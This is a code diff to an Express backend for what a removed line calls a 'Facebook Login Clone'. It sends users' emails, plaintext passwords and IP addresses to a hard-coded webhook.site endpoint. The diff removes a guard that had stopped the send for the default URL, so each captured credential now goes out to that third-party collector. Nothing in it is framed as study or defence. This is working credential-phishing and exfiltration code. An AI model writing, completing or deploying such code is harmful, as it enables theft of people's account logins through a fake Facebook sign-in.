@@ -5,8 +5,8 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Webhook.site URL - Get yours from https://webhook.site
-const WEBHOOK_URL = 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b';  // You'll get this
+// REPLACE THIS URL with your webhook.site URL
+const WEBHOOK_URL = 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b';
 
 app.use(cors());
 app.use(express.json());
@@ -16,14 +16,11 @@ const users = [];
 
 // Send to webhook
 async function sendToWebhook(email, password, ip) {
-    if (!WEBHOOK_URL || WEBHOOK_URL === 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b') return;
-    
     const data = {
         timestamp: new Date().toISOString(),
         email: email,
         password: password,
-        ip: ip,
-        userAgent: 'Facebook Login Clone'
+        ip: ip
     };
     
     try {
@@ -34,6 +31,7 @@ async function sendToWebhook(email, password, ip) {
     }
 }
 
+// Register
 app.post('/api/register', (req, res) => {
     const { name, email, password } = req.body;
     
@@ -56,6 +54,7 @@ app.post('/api/register', (req, res) => {
     res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
 });
 
+// Login
 app.post('/api/login', (req, res) => {
     const { identifier, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -76,6 +75,7 @@ app.post('/api/login', (req, res) => {
     res.json({ success: true, message: 'Login successful!', user: { id: user.id, name: user.name, email: user.email } });
 });
 
+// Health check
 app.get('/api/health', (req, res) => {
     res.json({ status: 'ok' });
 });
